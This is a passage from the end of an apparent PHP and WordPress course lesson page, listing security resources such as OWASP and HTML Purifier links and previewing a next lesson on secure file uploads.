                    <li><a href="https://developer.wordpress.org/plugins/security/nonces/" target="_blank">WordPress Nonces</a></li>
                </ul>
                
                <h3>Security Resources</h3>
                <ul>
                    <li><a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top Ten Web Application Security Risks</a></li>
                    <li><a href="https://cheatsheetseries.owasp.org/" target="_blank">OWASP Cheat Sheet Series</a></li>
                    <li><a href="https://www.acunetix.com/websitesecurity/cross-site-scripting/" target="_blank">Cross-Site Scripting (XSS) Attack</a></li>
                </ul>
                
                <h3>Libraries and Tools</h3>
                <ul>
                    <li><a href="http://htmlpurifier.org/" target="_blank">HTML Purifier</a></li>
                    <li><a href="https://github.com/ezyang/htmlpurifier" target="_blank">HTML Purifier on GitHub</a></li>
                    <li><a href="https://packagist.org/packages/erusev/parsedown" target="_blank">Parsedown (Markdown Parser)</a></li>
                </ul>
            </div>
        </section>

        <section class="next-lesson_preview">
            <h2>Coming Up Next: File Uploads with PHP</h2>
            <p>In our next lecture, we'll explore how to handle file uploads securely:</p>
            <ul>
                <li>Understanding PHP's file upload mechanisms</li>
                <li>Validating file types, sizes, and content</li>
                <li>Storing uploaded files securely</li>
                <li>Preventing common file upload vulnerabilities</li>
                <li>Implementing secure file handling in WordPress</li>
            </ul>
            <p>Be sure to complete the homework exercises to practice the sanitization techniques we've covered in this lecture before moving on to file uploads!</p>
        </section>
            
<div class="lesson-navigation">
<a class="lesson-nav-button prev" href="/module2.html">
<svg fill="currentColor" height="20" viewbox="0 0 20 20" width="20">
<path d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z"></path>
</svg>
<span>
<small>Back to</small><br/>
                                    Module 2 Overview
                                </span>
</a>
<button class="complete-lesson-btn">
                                Mark as Complete
                            </button>
<a class="lesson-nav-button next" href="/module3.html">
<span>
<small>Next Module</small><br/>
                                    Module 3: MySQL Database
                                </span>
<svg fill="currentColor" height="20" viewbox="0 0 20 20" width="20">
<path d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z"></path>
</svg>
</a>
</div>
</article>
</div>
</div>
</main>
<!-- Footer -->
<footer class="site-footer" role="contentinfo">
<div class="footer-container">
<div class="footer-content">
<div class="footer-section footer-about">
<h3>PHP WordPress Development</h3>
<p>Complete Web Development Course</p>
</div>
<div class="footer-section">
<h4>Quick Links</h4>
<ul class="footer-links">
<li><a href="/">Home</a></li>
<li><a href="/module2.html">Module 2</a></li>
<li><a href="/resources.html">Resources</a></li>
</ul>
</div>
<div class="footer-section">
<h4>Support</h4>
<ul class="footer-links">
<li><a href="/help.html">Help Center</a></li>
<li><a href="/faq.html">FAQ</a></li>
<li><a href="/contact.html">Contact</a></li>
</ul>
</div>
</div>
<div class="footer-bottom">
<div class="footer-bottom-content">
<p class="copyright">© 2025 PHP WordPress Development Course</p>
<nav class="footer-bottom-links">
<a href="/privacy.html">Privacy</a>
<span class="separator">|</span>
<a href="/terms.html">Terms</a>
</nav>
</div>
</div>
</div>
</footer>
</div>
<!-- Back to Top -->
<button aria-label="Back to top" class="back-to-top" id="back-to-top">
<svg fill="none" height="24" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24" width="24">
<path d="M12 19V5M12 5l-7 7M12 5l7 7"></path>
</svg>
</button>
<!-- JavaScript -->
<script src="/assets/js/navigation.js"></script>
<script src="/assets/js/site-config.js"></script>
<script src="/assets/js/sidebar-toggle.js"></script><script src="/assets/js/mermaid-universal-fix.js"></script>
</body>
</html>